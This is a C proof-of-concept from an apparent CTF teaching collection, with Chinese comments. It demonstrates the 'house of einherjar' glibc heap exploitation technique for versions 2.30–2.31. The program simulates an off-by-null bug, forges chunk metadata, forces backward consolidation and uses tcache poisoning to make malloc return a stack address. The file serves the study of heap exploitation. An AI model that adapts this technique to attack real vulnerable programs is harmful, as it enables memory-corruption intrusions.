/*
 * 中文导读（CTF 版）
 *
 * 手法：house_of_einherjar
 * 文件标注范围：2.30 ~ 2.31
 * 模拟漏洞：off-by-null/off-by-one 清除 PREV_INUSE，且可伪造 prev_size 与前块双向链。
 * 核心流程：让 free 误认为前方存在 fake free chunk，后向合并出覆盖活动 chunk 的大块，再借 tcache poisoning 定位目标。
 * 成功判据：重分配得到重叠或目标地址。2.29 起 prev_size 必须与前块 size 相等，2.32 起 poisoning 需安全链接。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <malloc.h>
#include <assert.h>

int main()
{
	/*
	 * 这是 Huascar Tejeda（@htejeda）为启用 tcache 的版本改造的 Einherjar。
	 * off-by-null 清除下一块 PREV_INUSE，伪 prev_size 令其向后合并到堆内
	 * fake chunk；堆泄漏用于计算距离。先填满相应 tcache，确保关键 free
	 * 越过 tcache 并进入可执行 backward consolidation 的 unsorted 路径。
	 *
	 * fake chunk 放在当前 arena 已向系统申请的堆范围内，避免普通 bin 对
	 * chunk size 不得超过 system_mem 的约束；相关加固提交：
	 * https://sourceware.org/git/?p=glibc.git;a=commit;f=malloc/malloc.c;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c
	 */

    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    // 选择一个栈地址作为 tcache poisoning 的最终任意分配目标。
    intptr_t stack_var[4];

    intptr_t *a = malloc(0x38);

	// 在 a 的用户区开头伪造 free chunk；它位于真实 heap，满足 system_mem 范围检查。

    a[0] = 0;    // fake chunk 自身的 prev_size 在本向后合并路径中不使用。
    a[1] = 0x60; // 初始合法 size；稍后覆盖为 fake chunk 到 c header 的真实距离。
    a[2] = (size_t) a; // fd 自环，满足 unlink 的 FD->bk == P。
    a[3] = (size_t) a; // bk 自环，满足 unlink 的 BK->fd == P。

    uint8_t *b = (uint8_t *) malloc(0x28);

    int real_b_size = malloc_usable_size(b);

	/*
	 * 选择请求 0xf8，使对齐后的物理 size 为 0x100、带 PREV_INUSE 时为 0x101。
	 * 最低有效尺寸字节本来就是 0x00，off-by-null 只会清除标志位，不会意外
	 * 缩小 chunk；若低字节还含尺寸，必须在缩小后的边界另行伪造 next chunk。
	 */
    uint8_t *c = (uint8_t *) malloc(0xf8);

    uint64_t* c_size_ptr = (uint64_t*)(c - 8);
    // off-by-null 覆盖 c->size 最低字节，清除 PREV_INUSE 而保持有效尺寸 0x100。

    b[real_b_size] = 0;

    // 在 b 末尾伪造 c->prev_size，使 backward consolidation 从 c 精确回退到 a。

    size_t fake_size = (size_t)((c - sizeof(size_t) * 2) - (uint8_t*) a);

    *(size_t*) &b[real_b_size-sizeof(size_t)] = fake_size;

    // 把 a->size 同步为 c->prev_size，满足 size(P)==prev_size(next_chunk(P))。
    a[1] = fake_size;

    // 在释放 c 前填满 0x100 tcache，使 c 越过 tcache 并真正执行 backward consolidation。
    intptr_t *x[7];
    for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++) {
        x[i] = malloc(0xf8);
    }

    for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++) {
        free(x[i]);
    }

    free(c);

    intptr_t *d = malloc(0x158);

    // 合并后从大 free 区重新切块，利用重叠写继续执行 tcache poisoning。
    uint8_t *pad = malloc(0x28);
    free(pad);

    free(b);

    d[0x30 / 8] = (long) stack_var;

    // 先取走正常链头，再申请一次取得被伪造进 tcache 的 target。
    malloc(0x28);
    intptr_t *e = malloc(0x28);

    // 严格断言返回地址就是栈上 target，排除只完成重叠而未完成 poisoning。
    assert(e == stack_var);
}
